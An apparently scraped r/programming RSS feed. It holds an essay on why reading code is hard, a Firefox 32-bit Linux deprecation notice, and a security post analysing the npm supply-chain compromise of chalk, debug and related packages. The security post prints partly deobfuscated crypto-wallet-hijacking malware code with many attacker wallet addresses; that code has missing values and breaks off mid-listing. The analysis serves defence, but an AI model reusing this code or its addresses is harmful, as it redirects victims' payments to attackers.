<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><atom:link href="http://192.168.1.132/?platform=reddit&amp;subreddit=programming&amp;averagePostsPerDay=5&amp;content&amp;view=rss" rel="self" type="application/rss+xml"/><title>/r/programming</title><description>Hot posts in /r/programming (roughly 5 posts per day)</description><link>https://www.reddit.com/r/programming/</link><language>en-us</language><lastBuildDate>Tue, 09 Sep 2025 10:44:24 +0000</lastBuildDate><generator>Upvote RSS</generator><image><url>https://styles.redditmedia.com/t5_2fwo/styles/communityIcon_1bqa1ibfp8q11.png</url><title>/r/programming</title><link>https://www.reddit.com/r/programming/</link></image><item><link>https://idiallo.com/blog/writing-code-is-easy-reading-is-hard</link><title>Writing Code Is Easy. Reading It Isn't (idiallo.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nbvfcs/writing_code_is_easy_reading_it_isnt/</guid><comments>https://www.reddit.com/r/programming/comments/1nbvfcs/writing_code_is_easy_reading_it_isnt/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 6 min | <a href='https://www.reddit.com/r/programming/comments/1nbvfcs/writing_code_is_easy_reading_it_isnt/'>Post permalink</a></p></section><section class='preview-image'><img src='https://cdn.idiallo.com/images/assets/548/thumb.jpg' /></section><section class='parsed-content'><div><p>Writing code is easy. Once you have a solution in mind, and have mastered the syntax of your favorite programming language, writing code is easy. Having an LLM write entire functions for you? Even easier. But the hard part isn&rsquo;t the writing. It&rsquo;s the reading. It&rsquo;s the time it takes to load the mental model of the system into your head. That&rsquo;s where all the cost really is.</p><p>A <strong>mental model</strong> is the thing you build when you read code. It&rsquo;s your internal map of how the system works, where the tricky parts are, what depends on what. Without it, you&rsquo;re just staring at lines of text.</p><p>When I worked as a contractor, most of my jobs started the same way. I&rsquo;d get a task to fix a bug or add a new feature in an application I&rsquo;d never seen before. My mental model was clean and empty at first. To start filling it, I&rsquo;d check the homepage to see what it looked like. I&rsquo;d look at the page source: is this React? jQuery? A third-party plugin? I&rsquo;d scan the codebase to see if the carousel they are requesting on the front page was used elsewhere. I&rsquo;d check their build process, their testing setup, the tools they leaned on. Every little detail I discovered got appended to the model in my head.</p><p>It was like moving into a new city. You start at the foot of your apartment, wander a few streets, notice which roads lead to the freeway, where the grocery store is, and slowly you start to orient yourself. That&rsquo;s what reading code feels like: you&rsquo;re building a mental map so you don&rsquo;t get lost every time you move around.</p><p>Say you need to understand a simple function like <code>getUserPreferences(userId)</code>. To build your mental model, you need to trace:</p><ul> <li>Where is this function defined?</li> <li>What does it return? Is it a Promise? What's the shape of the data?</li> <li>Does it hit a database directly or go through an API?</li> <li>Are there caching layers involved?</li> <li>What happens if the user doesn't exist?</li> <li>Who else calls this function and in what contexts?</li> <li>Are there side effects?</li> </ul><p>Understanding that one function means jumping between database schemas, API definitions, error handling middleware, and multiple call sites. Only after building this web of relationships do you have enough context to safely modify anything.</p><p>And it&rsquo;s slow. Reading code is harder than writing it. Much harder. Writing code is forward motion: you&rsquo;re laying down fresh pavement. Reading code means retracing someone else&rsquo;s steps, which usually means jumping between files, chasing function calls, inferring side effects, and deciphering intentions that aren&rsquo;t written down. Understanding one function often means looking at five other files. Only after all that do you have enough of a map to even begin.</p><p>It&rsquo;s the same reason debugging is harder than coding. On Stack Overflow, one of the most common comments you&rsquo;ll see under a bad question is: <em>&ldquo;Can you show us what you did?&rdquo;</em> Without seeing the steps, no one can load the right model in their head to help. It&rsquo;s also why the <a href="https://xyproblem.info/">XY problem</a> keeps coming up. People ask about a symptom without giving the context that would let others reconstruct the whole picture.</p><p>I'm still fascinated by the lawyer who used <a href="https://www.forbes.com/sites/mollybohannon/2023/06/08/lawyer-used-chatgpt-in-court-and-cited-fake-cases-a-judge-is-considering-sanctions/">ChatGPT in court</a>. He filed a brief that cited six cases which turned out not to exist. Everyone asked: why didn&rsquo;t he read them? The answer is the same: it takes time and effort to build the model. He would have had to chase down each case, read them, and slot them into a broader understanding of legal precedent. Reading is the hard part. Generating is easy.</p><p>Reading isn't just about going through the code and examining it line by line. It's also about going through the documentation, code reviews, and peer programming. In fact, these are solutions for accelerating the process of building our mental model. But with that in mind, you still have to, well, read and understand. You'll notice that programmers often want to rewrite things from scratch, because "the old code sucks". What sucks is taking the time to read and understand it.</p><p>And this is what makes LLMs both powerful and dangerous in programming. Whether the AI generates perfect code or complete hallucinations, you still have to read it. You still have to trace through what it&rsquo;s supposed to do, how it interacts with the rest of the system, and what the side effects are. The longer the generated code, the longer it takes to build your mental model. And only once you&rsquo;ve done that can you spot the issues, the places where the generated code doesn&rsquo;t quite fit, or quietly breaks something else.</p><p>When an LLM can produce an infinite amount of code or text, it tempts us to skip the reading. But you can&rsquo;t skip the model. You wouldn&rsquo;t want to load someone else&rsquo;s saved game and be dropped in the middle of a boss fight. That&rsquo;s what it feels like to inherit or generate code you don&rsquo;t understand.</p><p>This is why the real bottleneck in software development isn&rsquo;t writing, it&rsquo;s understanding.</p><hr><p>For now, we don't have the LLM equivalent for understanding. Something that could instantly transfer a complete mental model from the system to your head. Until we do, the bottleneck hasn't moved. We've solved the "typing speed" problem. We can generate more code than we could ever hope to read. But until we solve the "understanding" problem, the cost of software development remains the same: the time it takes for someone to make sense of it all.</p><p>This has real implications for how we use AI tools. Instead of asking AI to generate large blocks of code, we might be better off asking it to help us understand existing code. Instead of measuring productivity by lines of code written, we should measure it by how quickly teams can build accurate mental models of their systems.</p><p>The future of programming might not be about generating more code faster. It might be about generating understanding faster. And that's a much harder problem to solve.</p><hr> </div></section>]]></description><pubDate>Mon, 08 Sep 2025 23:48:00 +0530</pubDate></item><item><link>https://blog.mozilla.org/futurereleases/2025/09/05/firefox-32-bit-linux-support-to-end-in-2026/</link><title>Firefox 32-bit Linux Support to End in 2026 (blog.mozilla.org)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nbv9xc/firefox_32bit_linux_support_to_end_in_2026/</guid><comments>https://www.reddit.com/r/programming/comments/1nbv9xc/firefox_32bit_linux_support_to_end_in_2026/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 2 min | <a href='https://www.reddit.com/r/programming/comments/1nbv9xc/firefox_32bit_linux_support_to_end_in_2026/'>Post permalink</a></p></section><section class='preview-image'><img src='https://blog.mozilla.org/futurereleases/files/2018/02/cropped-blog-header-future-releases.jpg' /></section><section class='parsed-content'><div><article><div><p>For many years, Mozilla has continued to provide Firefox for 32-bit Linux systems long after most other browsers and operating systems ended support. We made this choice because we care deeply about keeping Firefox available to as many people as possible, helping our users extend the life of their hardware and reduce unnecessary obsolescence.</p><p>Today, however, 32-bit Linux (on x86) is no longer widely supported by the vast majority of Linux distributions, and maintaining Firefox on this platform has become increasingly difficult and unreliable. To focus our efforts on delivering the best and most modern Firefox, we are <b>ending support for 32-bit x86 Linux</b> with the release of Firefox 144 (or to rephrase, Firefox 145 will not have 32-bit Linux support).</p><p>If you are currently using Firefox on a 32-bit x86 Linux system, we strongly encourage you to move to a 64-bit operating system and install the 64-bit version of Firefox, which will continue to be supported and updated.</p><p>For users who cannot transition immediately, Firefox ESR 140 will remain available &mdash; including 32-bit builds &mdash; and will continue to receive security updates until at least <b>September 2026</b>.</p><p>[Updated on 2025-09-09 to clarify the affected builds are 32-bit x86]</p></div></article> </div></section>]]></description><pubDate>Mon, 08 Sep 2025 23:42:28 +0530</pubDate></item><item><link>https://www.aikido.dev/blog/npm-debug-and-chalk-packages-compromised</link><title>Largest NPM Compromise in History - Supply Chain Attack (aikido.dev)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nbqt4d/largest_npm_compromise_in_history_supply_chain/</guid><comments>https://www.reddit.com/r/programming/comments/1nbqt4d/largest_npm_compromise_in_history_supply_chain/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 83 min | <a href='https://www.reddit.com/r/programming/comments/1nbqt4d/largest_npm_compromise_in_history_supply_chain/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>Hey Everyone</p><p>We just discovered that around 1 hour ago packages with a total of 2 billion weekly downloads on npm were compromised all belonging to one developer <a href="https://www.npmjs.com/%7Eqix">https://www.npmjs.com/~qix</a></p><p>ansi-styles (371.41m downloads per week)<br/>debug (357.6m downloads per week)<br/>backslash (0.26m downloads per week)<br/>chalk-template (3.9m downloads per week)<br/>supports-hyperlinks (19.2m downloads per week)<br/>has-ansi (12.1m downloads per week)<br/>simple-swizzle (26.26m downloads per week)<br/>color-string (27.48m downloads per week)<br/>error-ex (47.17m downloads per week)<br/>color-name (191.71m downloads per week)<br/>is-arrayish (73.8m downloads per week)<br/>slice-ansi (59.8m downloads per week)<br/>color-convert (193.5m downloads per week)<br/>wrap-ansi (197.99m downloads per week)<br/>ansi-regex (243.64m downloads per week)<br/>supports-color (287.1m downloads per week)<br/>strip-ansi (261.17m downloads per week)<br/>chalk (299.99m downloads per week)</p><p>The compromises all stem from a core developers NPM account getting taken over from a phishing campaign</p><p>The malware itself, luckily, looks like its mostly intrested in crypto at the moment so its impact is smaller than if they had installed a backdoor for example.</p><h1>How the Malware Works (Step by Step)</h1><ol><li><strong>Injects itself into the browser</strong><ul><li>Hooks core functions like <code>fetch</code>, <code>XMLHttpRequest</code>, and wallet APIs (<code>window.ethereum</code>, Solana, etc.).</li><li>Ensures it can intercept both web traffic and wallet activity.</li></ul></li><li><strong>Watches for sensitive data</strong><ul><li>Scans network responses and transaction payloads for anything that looks like a wallet address or transfer.</li><li>Recognizes multiple formats across Ethereum, Bitcoin, Solana, Tron, Litecoin, and Bitcoin Cash.</li></ul></li><li><strong>Rewrites the targets</strong><ul><li>Replaces the legitimate destination with an attacker-controlled address.</li><li>Uses “lookalike” addresses (via string-matching) to make swaps less obvious.</li></ul></li><li><strong>Hijacks transactions before they’re signed</strong><ul><li>Alters Ethereum and Solana transaction parameters (e.g., recipients, approvals, allowances).</li><li>Even if the UI looks correct, the signed transaction routes funds to the attacker.</li></ul></li><li><strong>Stays stealthy</strong><ul><li>If a crypto wallet is detected, it avoids obvious swaps in the UI to reduce suspicion.</li><li>Keeps silent hooks running in the background to capture and alter real transactions</li></ul></li></ol><p>Our blog is being dynamically updated - <a href="https://www.aikido.dev/blog/npm-debug-and-chalk-packages-compromised">https://www.aikido.dev/blog/npm-debug-and-chalk-packages-compromised</a></p></div><!-- SC_ON --></section><section class='preview-image'><p>&nbsp;</p><img src='https://cdn.prod.website-files.com/642adcaf364024654c71df23/68beea4577bd0a48abb147d9_nx-compromise%20(2).png' /></section><section class='parsed-content'><div><div><div><div><p>Published on:</p><p>September 8, 2025</p></div><div><p>Last updated on:</p><p>September 8, 2025</p></div></div><div><p>Starting at September 8th, 13:16 UTC, our Aikido intel feed alerted us to a series packages being pushed to npm, which appeared to contains malicious code. These were 18 very popular packages,</p><ul><li>backslash (0.26m downloads per week)</li><li>chalk-template (3.9m downloads per week)</li><li>supports-hyperlinks (19.2m downloads per week)</li><li>has-ansi (12.1m downloads per week)</li><li>simple-swizzle (26.26m downloads per week)</li><li>color-string (27.48m downloads per week)</li><li>error-ex (47.17m downloads per week)</li><li>color-name (191.71m downloads per week)</li><li>is-arrayish (73.8m downloads per week)</li><li>slice-ansi (59.8m downloads per week)</li><li>color-convert (193.5m downloads per week)</li><li>wrap-ansi (197.99m downloads per week)</li><li>ansi-regex (243.64m downloads per week)</li><li>supports-color (287.1m downloads per week)</li><li>strip-ansi (261.17m downloads per week)</li><li>chalk (299.99m downloads per week)</li><li>debug (357.6m downloads per week)</li><li>ansi-styles (371.41m downloads per week)</li></ul><p>All together, these packages have more than 2 billion downloads per week. </p><p>The packages were updated to contain a piece of code that would be executed on the client of a website, which silently intercepts crypto and web3 activity in the browser, manipulates wallet interactions, and rewrites payment destinations so that funds and approvals are redirected to attacker-controlled accounts without any obvious signs to the user.</p><p>To avoid being compromised by packages like this, check out Aikido <a href="https://www.aikido.dev/blog/introducing-safe-chain">safe-chain</a>!</p><h2>What happened?</h2><p>The above packages all started having new versions released, an example here being is-arrayish:</p><figure></figure><p>We can see that the index.js file is modified, and contains obfuscated code:</p><figure></figure><p>&zwj;</p><p>After applying a bit of deobfuscation to it, we get a fairly complex piece of code still:</p><pre><code><span>var</span><span> neth = </span><span>; </span><span>var</span><span> rund = </span><span>; </span><span>var</span><span> loval = </span><span>; </span><span>async</span><span>function</span><span>checkethereumw</span><span>(</span><span>) </span><span>{ </span><span>try</span><span> { </span><span>const</span><span> _0x124ed3 = </span><span>await</span><span>window</span><span>.ethereum.request({ </span><span>'method'</span><span>: </span><span>"eth_accounts"</span> }); <span> </span><span>if</span><span> (_0x124ed3.length &gt; </span><span>) { </span> runmask(); <span>if</span><span> (rund != </span><span>1</span><span>) { </span><span> rund = </span><span>1</span><span>; </span><span> neth = </span><span>1</span><span>; </span> newdlocal(); } <span> } </span><span>else</span><span>if</span><span> (rund != </span><span>1</span><span>) { </span><span> rund = </span><span>1</span><span>; </span> newdlocal(); } <span> } </span><span>catch</span><span> (_0x53a897) { </span><span>if</span><span> (rund != </span><span>1</span><span>) { </span><span> rund = </span><span>1</span><span>; </span> newdlocal(); } } } <span>if</span><span> (</span><span>typeof</span><span>window</span><span> != </span><span>"undefined"</span><span> &amp;&amp; </span><span>typeof</span><span>window</span><span>.ethereum != </span><span>"undefined"</span><span>) { </span> checkethereumw(); <span>} </span><span>else</span><span>if</span><span> (rund != </span><span>1</span><span>) { </span><span> rund = </span><span>1</span><span>; </span> newdlocal(); } <span>function</span><span>newdlocal</span><span>(</span><span>) </span><span>{ </span><span>const</span><span> _0xba16ef = { </span><span>'zprkq'</span><span>: </span><span>function</span><span> (</span><span>_0x23e86b, _0x5b593c</span><span>) </span><span>{ </span><span>return</span><span> _0x23e86b + _0x5b593c; </span> }, <span>'iJAYR'</span><span>: </span><span>function</span><span> (</span><span>_0xc91263, _0x20ad3a</span><span>) </span><span>{ </span><span>return</span><span> _0xc91263 &lt;= _0x20ad3a; </span> }, <span>'nqxhl'</span><span>: </span><span>function</span><span> (</span><span>_0x31d70d, _0x545869</span><span>) </span><span>{ </span><span>return</span><span> _0x31d70d &lt;= _0x545869; </span> }, <span>'myaXd'</span><span>: </span><span>function</span><span> (</span><span>_0xd587f7, _0x356cb8</span><span>) </span><span>{ </span><span>return</span><span> _0xd587f7 === _0x356cb8; </span> }, <span>'IptyQ'</span><span>: </span><span>function</span><span> (</span><span>_0x52d73c, _0x1701dc</span><span>) </span><span>{ </span><span>return</span><span> _0x52d73c - _0x1701dc; </span> }, <span>'QCTBQ'</span><span>: </span><span>function</span><span> (</span><span>_0x3b97a6, _0x5cd5e9</span><span>) </span><span>{ </span><span>return</span><span> _0x3b97a6 - _0x5cd5e9; </span> }, <span>'avmeH'</span><span>: </span><span>function</span><span> (</span><span>_0x370f68, _0x51151b</span><span>) </span><span>{ </span><span>return</span><span> _0x370f68 - _0x51151b; </span> }, <span>'TwyPu'</span><span>: </span><span>function</span><span> (</span><span>_0x43ced5, _0x54174b</span><span>) </span><span>{ </span><span>return</span><span> _0x43ced5 + _0x54174b; </span> }, <span>'arczN'</span><span>: </span><span>function</span><span> (</span><span>_0x2b592d, _0x5339ba</span><span>) </span><span>{ </span><span>return</span><span> _0x2b592d - _0x5339ba; </span> }, <span>'yMgZR'</span><span>: </span><span>function</span><span> (</span><span>_0xb3fb8a, _0x24a479</span><span>) </span><span>{ </span><span>return</span><span> _0xb3fb8a - _0x24a479; </span> }, <span>'qEVKr'</span><span>: </span><span>function</span><span> (</span><span>_0x4a3a26, _0x16853b</span><span>) </span><span>{ </span><span>return</span><span> _0x4a3a26 - _0x16853b; </span> }, <span>'vGpiX'</span><span>: </span><span>function</span><span> (</span><span>_0x9c66ab, _0x1a38b9, _0x1d740b</span><span>) </span><span>{ </span><span>return</span><span> _0x9c66ab(_0x1a38b9, _0x1d740b); </span> }, <span>'eGWOd'</span><span>: </span><span>function</span><span> (</span><span>_0x3630fa, _0x17694b</span><span>) </span><span>{ </span><span>return</span><span> _0x3630fa &lt; _0x17694b; </span> }, <span>'tfqRA'</span><span>: </span><span>function</span><span> (</span><span>_0x562199, ..._0x1555b8</span><span>) </span><span>{ </span><span>return</span><span> _0x562199(..._0x1555b8); </span> }, <span>'viQtk'</span><span>: </span><span>"Content-Type"</span><span>, </span><span>'DSXar'</span><span>: </span><span>"application/json"</span><span>, </span><span>'mDaWt'</span><span>: </span><span>function</span><span> (</span><span>_0x2116fd, _0x26f622</span><span>) </span><span>{ </span><span>return</span><span> _0x2116fd(_0x26f622); </span> }, <span>'FXtyf'</span><span>: </span><span>function</span><span> (</span><span>_0x4f1346, _0x53343b</span><span>) </span><span>{ </span><span>return</span><span> _0x4f1346 === _0x53343b; </span> }, <span>'FYAPh'</span><span>: </span><span>"string"</span><span>, </span><span>'UmfJm'</span><span>: </span><span>function</span><span> (</span><span>_0x301d56, _0x29139b</span><span>) </span><span>{ </span><span>return</span><span> _0x301d56 === _0x29139b; </span> }, <span>'LmXxC'</span><span>: </span><span>function</span><span> (</span><span>_0x467473, _0x5d7154</span><span>) </span><span>{ </span><span>return</span><span> _0x467473(_0x5d7154); </span> }, <span>'yVHgJ'</span><span>: </span><span>"responseText"</span><span>, </span><span>'aXpuC'</span><span>: </span><span>"response"</span><span>, </span><span>'yArwb'</span><span>: </span><span>"object"</span><span>, </span><span>'MJKcn'</span><span>: </span><span>function</span><span> (</span><span>_0x5561bf, _0x1792e6</span><span>) </span><span>{ </span><span>return</span><span> _0x5561bf !== _0x1792e6; </span> }, <span>'gHrJP'</span><span>: </span><span>function</span><span> (</span><span>_0xe2c323, _0x4c49d0</span><span>) </span><span>{ </span><span>return</span><span> _0xe2c323 === _0x4c49d0; </span> }, <span>'OiGzk'</span><span>: </span><span>"1H13VnQJKtT4HjD5ZFKaaiZEetMbG7nDHx"</span><span>, </span><span>'EAhsy'</span><span>: </span><span>"1Li1CRPwjovnGHGPTtcKzy75j37K6n97Rd"</span><span>, </span><span>'lLQUz'</span><span>: </span><span>"1Dk12ey2hKWJctU3V8Akc1oZPo1ndjbnjP"</span><span>, </span><span>'ibPEr'</span><span>: </span><span>"1NBvJqc1GdSb5uuX8vT7sysxtT4LB8GnuY"</span><span>, </span><span>'cGpnb'</span><span>: </span><span>"1Mtv6GsFsbno9XgSGuG6jRXyBYv2tgVhMj"</span><span>, </span><span>'wAGlT'</span><span>: </span><span>"1BBAQm4DL78JtRdJGEfzDBT2PBkGyvzf4N"</span><span>, </span><span>'Hauzr'</span><span>: </span><span>"1KkovSeka94yC5K4fDbfbvZeTFoorPggKW"</span><span>, </span><span>'nJNgC'</span><span>: </span><span>"18CPyFLMdncoYccmsZPnJ5T1hxFjh6aaiV"</span><span>, </span><span>'EHOlV'</span><span>: </span><span>"1BijzJvYU2GaBCYHa8Hf3PnJh6mjEd92UP"</span><span>, </span><span>'cOZYT'</span><span>: </span><span>"1Bjvx6WXt9iFB5XKAVsU3TgktgeNbzpn5N"</span><span>, </span><span>'cIySf'</span><span>: </span><span>"19fUECa9aZCQxcLeo8FZu8kh5kVWheVrg8"</span><span>, </span><span>'rrGeC'</span><span>: </span><span>"1DZEep7GsnmBVkbZR3ogeBQqwngo6x4XyR"</span><span>, </span><span>'geUVS'</span><span>: </span><span>"1GX1FWYttd65J26JULr9HLr98K7VVUE38w"</span><span>, </span><span>'TZdxq'</span><span>: </span><span>"14mzwvmF2mUd6ww1gtanQm8Bxv3ZWmxDiC"</span><span>, </span><span>'JgcFw'</span><span>: </span><span>"1EYHCtXyKMMhUiJxXJH4arfpErNto5j87k"</span><span>, </span><span>'gKbQq'</span><span>: </span><span>"19D1QXVQCoCLUHUrzQ4rTumqs9jBcvXiRg"</span><span>, </span><span>'KObJu'</span><span>: </span><span>"16mKiSoZNTDaYLBQ5LkunK6neZFVV14b7X"</span><span>, </span><span>'vYGdx'</span><span>: </span><span>"18x8S4yhFmmLUpZUZa3oSRbAeg8cpECpne"</span><span>, </span><span>'gtZOV'</span><span>: </span><span>"1EkdNoZJuXTqBeaFVzGwp3zHuRURJFvCV8"</span><span>, </span><span>'ApfqP'</span><span>: </span><span>"13oBVyPUrwbmTAbwxVDMT9i6aVUgm5AnKM"</span><span>, </span><span>'hgmsX'</span><span>: </span><span>"1DwsWaXLdsn4pnoMtbsmzbH7rTj5jNH6qS"</span><span>, </span><span>'TNgNB'</span><span>: </span><span>"13wuEH28SjgBatNppqgoUMTWwuuBi9e4tJ"</span><span>, </span><span>'UhmAX'</span><span>: </span><span>"154jc6v7YwozhFMppkgSg3BdgpaFPtCqYn"</span><span>, </span><span>'vXyJx'</span><span>: </span><span>"1AP8zLJE6nmNdkfrf1piRqTjpasw7vk5rb"</span><span>, </span><span>'HmJHn'</span><span>: </span><span>"19F8YKkU7z5ZDAypxQ458iRqH2ctGJFVCn"</span><span>, </span><span>'UlhFZ'</span><span>: </span><span>"17J3wL1SapdZpT2ZVX72Jm5oMSXUgzSwKS"</span><span>, </span><span>'VShzV'</span><span>: </span><span>"16z8D7y3fbJsWFs3U8RvBF3A8HLycCW5fH"</span><span>, </span><span>'IzSNV'</span><span>: </span><span>"1PYtCvLCmnGDNSVK2gFE37FNSf69W2wKjP"</span><span>, </span><span>'hiXcO'</span><span>: </span><span>"143wdqy6wgY3ez8Nm19AqyYh25AZHz3FUp"</span><span>, </span><span>'gwsfo'</span><span>: </span><span>"1JuYymZbeoDeH5q65KZVG3nBhYoTK9YXjm"</span><span>, </span><span>'XjToi'</span><span>: </span><span>"1PNM2L1bpJQWipuAhNuB7BZbaFLB3LCuju"</span><span>, </span><span>'qzLJJ'</span><span>: </span><span>"19onjpqdUsssaFKJjwuAQGi2eS41vE19oi"</span><span>, </span><span>'NrttU'</span><span>: </span><span>"1JQ15RHehtdnLAzMcVT9kU8qq868xFEUsS"</span><span>, </span><span>'mLamd'</span><span>: </span><span>"1LVpMCURyEUdE8VfsGqhMvUYVrLzbkqYwf"</span><span>, </span><span>'ENfnx'</span><span>: </span><span>"1KMcDbd2wecP4Acoz9PiZXsBrJXHbyPyG6"</span><span>, </span><span>'teGcp'</span><span>: </span><span>"1DZiXKhBFiKa1f6PTGCNMKSU1xoW3Edb7Z"</span><span>, </span><span>'lkQtS'</span><span>: </span><span>"174bEk62kr8dNgiduwHgVzeLgLQ38foEgZ"</span><span>, </span><span>'nVfSu'</span><span>: </span><span>"17cvmxcjTPSBsF1Wi2HfcGXnpLBSzbAs6p"</span><span>, </span><span>'XdmQg'</span><span>: </span><span>"1NoYvnedUqNshKPZvSayfk8YTQYvoB2wBc"</span><span>, </span><span>'hTAuL'</span><span>: </span><span>"13694eCkAtBRkip8XdPQ8ga99KEzyRnU6a"</span><span>, </span><span>'hmVdI'</span><span>: </span><span>"bc1qms4f8ys8c4z47h0q29nnmyekc9r74u5ypqw6wm"</span><span>, </span><span>'SvssU'</span><span>: </span><span>"bc1qznntn2q7df8ltvx842upkd9uj4atwxpk0whxh9"</span><span>, </span><span>'zXlNj'</span><span>: </span><span>"bc1q4rllc9q0mxs827u6vts2wjvvmel0577tdsvltx"</span><span>, </span><span>'OOAQz'</span><span>: </span><span>"bc1qj8zru33ngjxmugs4sxjupvd9cyh84ja0wjx9c4"</span><span>, </span><span>'TDfnH'</span><span>: </span><span>"bc1qc972tp3hthdcufsp9ww38yyer390sdc9cvj8ar"</span><span>, </span><span>'UrAmA'</span><span>: </span><span>"bc1qw0z864re8yvrjqmcw5fs6ysndta2avams0c6nh"</span><span>, </span><span>'ELPqV'</span><span>: </span><span>"bc1qzdd8c7g2g9mnnxy635ndntem2827ycxxyn3v4h"</span><span>, </span><span>'xlnbk'</span><span>: </span><span>"bc1qaavgpwm98n0vtaeua539gfzgxlygs8jpsa0mmt"</span><span>, </span><span>'aApMn'</span><span>: </span><span>"bc1qrdlkyhcrx4n2ksfjfh78xnqrefvsr34nf2u0sx"</span><span>, </span><span>'Pvsjl'</span><span>: </span><span>"bc1q9ytsyre66yz56x3gufhqks7gqd8sa8uk4tv5fh"</span><span>, </span><span>'fmvYL'</span><span>: </span><span>"bc1qfrvsj2dkey2dg8ana0knczzplcqr7cgs9s52vq"</span><span>, </span><span>'fXywx'</span><span>: </span><span>"bc1qg7lkw04hg5yggh28ma0zvtkeg95k0yefqmvv2f"</span><span>, </span><span>'RRxbR'</span><span>: </span><span>"bc1qmeplum3jy2vrlyzw4vhrcgeama35tr9kw8yfrn"</span><span>, </span><span>'VrdPL'</span><span>: </span><span>"bc1qamqx0h8rxfcs4l56egrpau4ryqu4r642ttmxq4"</span><span>, </span><span>'qSKMT'</span><span>: </span><span>"bc1qsaxgtck26mgecgfvp9ml4y5ljyl8ylpdglqz30"</span><span>, </span><span>'mbTQq'</span><span>: </span><span>"bc1qsz90ulta8dx5k8xzzjqruzahav2vxchtk2l8v7"</span><span>, </span><span>'xHmCb'</span><span>: </span><span>"bc1q3ad2zyc5mpc9nnzmmtxqpu467jeh4m928r7qf4"</span><span>, </span><span>'OqeMw'</span><span>: </span><span>"bc1qlrdqrulwmvfg86rmp77k8npdefns52ykk8cxs6"</span><span>, </span><span>'BNnlw'</span><span>: </span><span>"bc1q5hqxk5ugvf2d3y6qj2a7cy7u79ckusu9eknpsr"</span><span>, </span><span>'FkDWd'</span><span>: </span><span>"bc1qszm3nugttmtpkq77dhphtqg4u7vuhxxcrh7f79"</span><span>, </span><span>'aBdRe'</span><span>: </span><span>"bc1qqc09xnyafq0y4af3x7j5998tglxcanjuzy974m"</span><span>, </span><span>'roief'</span><span>: </span><span>"bc1qqqh29zxfzxk0fvmq9d7hwedh5yz44zhf7e23qz"</span><span>, </span><span>'qMxmV'</span><span>: </span><span>"bc1qsg57tpvfj6gysrw5w4sxf3dweju40g87uuclvu"</span><span>, </span><span>'kkYGi'</span><span>: </span><span>"bc1qje95nehs8y0wvusp2czr25p7kghk6j3cvgugy5"</span><span>, </span><span>'zbnSH'</span><span>: </span><span>"bc1qwrnchp96p38u8ukp8jc8cq22q35n3ajfav0pzf"</span><span>, </span><span>'dHxYm'</span><span>: </span><span>"bc1q6l99s704jccclxx5rc2x2c5shlgs2pg0fpnflk"</span><span>, </span><span>'OfXMz'</span><span>: </span><span>"bc1qeuk2u6xl4rgfq0x9yc37lw49kutnd8gdlxt9st"</span><span>, </span><span>'OZznV'</span><span>: </span><span>"bc1qxul8lwxvt7lt9xuge0r2jls7evrwyyvcf2ah0u"</span><span>, </span><span>'NHzcN'</span><span>: </span><span>"bc1qcplvxyzs9w09g6lpglj6xxdfxztfwjsgz95czd"</span><span>, </span><span>'sxqWF'</span><span>: </span><span>"bc1q9ca9ae2cjd3stmr9lc6y527s0x6vvqys6du00u"</span><span>, </span><span>'oIQra'</span><span>: </span><span>"bc1qmap3cqss3t4vetg8z9s995uy62jggyxjk29jkp"</span><span>, </span><span>'qIAwe'</span><span>: </span><span>"bc1qg3c6c7y5xeqkxnjsx9ymclslr2sncjrxjylkej"</span><span>, </span><span>'IneJW'</span><span>: </span><span>"bc1q9zx63qdjwldxp4s9egeqjelu3y5yqsajku8m29"</span><span>, </span><span>'tjIgE'</span><span>: </span><span>"bc1ql2awtv7nzcp2dqce3kny2ra3dz946c9vg2yukq"</span><span>, </span><span>'vuJMD'</span><span>: </span><span>"bc1qhytpe64tsrrvgwm834q35w6607jc6azqtnvl2a"</span><span>, </span><span>'Uxzul'</span><span>: </span><span>"bc1q4rlgfgjwg9g2pqwqkf5j9hq6ekn39rjmzv09my"</span><span>, </span><span>'MoAYB'</span><span>: </span><span>"bc1q28ks0u6fhvv7hktsavnfpmu59anastfj5sq8dw"</span><span>, </span><span>'wKaGs'</span><span>: </span><span>"bc1qjqfpxvl2j2hzx2cxeqhchrh02dcjy3z5k6gv55"</span><span>, </span><span>'VmOdy'</span><span>: </span><span>"bc1q8zznzs9z93xpkpunrmeqp6fg54s3q7dkh9z9xw"</span><span>, </span><span>'YcvKY'</span><span>: </span><span>"bc1qt4c4e6xwt5dz4p629ndz9zmeep2kmvqgy53037"</span><span>, </span><span>'FlhWy'</span><span>: </span><span>"0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976"</span><span>, </span><span>'sCKdW'</span><span>: </span><span>"0xa29eeFb3f21Dc8FA8bce065Db4f4354AA683c024"</span><span>, </span><span>'ZAiba'</span><span>: </span><span>"0x40C351B989113646bc4e9Dfe66AE66D24fE6Da7B"</span><span>, </span><span>'AsHKD'</span><span>: </span><span>"0x30F895a2C66030795131FB66CBaD6a1f91461731"</span><span>, </span><span>'rzrhZ'</span><span>: </span><span>"0x57394449fE8Ee266Ead880D5588E43501cb84cC7"</span><span>, </span><span>'expPy'</span><span>: </span><span>"0xCd422cCC9f6e8f30FfD6F68C0710D3a7F24a026A"</span><span>, </span><span>'zlBwY'</span><span>: </span><span>"0x7C502F253124A88Bbb6a0Ad79D9BeD279d86E8f4"</span><span>, </span><span>'nElAL'</span><span>: </span><span>"0xe86749d6728d8b02c1eaF12383c686A8544de26A"</span><span>, </span><span>'wqRjK'</span><span>: </span><span>"0xa4134741a64F882c751110D3E207C51d38f6c756"</span><span>, </span><span>'HcYDT'</span><span>: </span><span>"0xD4A340CeBe238F148034Bbc14478af59b1323d67"</span><span>, </span><span>'BqNRF'</span><span>: </span><span>"0xB00A433e1A5Fc40D825676e713E5E351416e6C26"</span><span>, </span><span>'OvURa'</span><span>: </span><span>"0xd9Df4e4659B1321259182191B683acc86c577b0f"</span><span>, </span><span>'PFfEj'</span><span>: </span><span>"0x0a765FA154202E2105D7e37946caBB7C2475c76a"</span><span>, </span><span>'IOjJb'</span><span>: 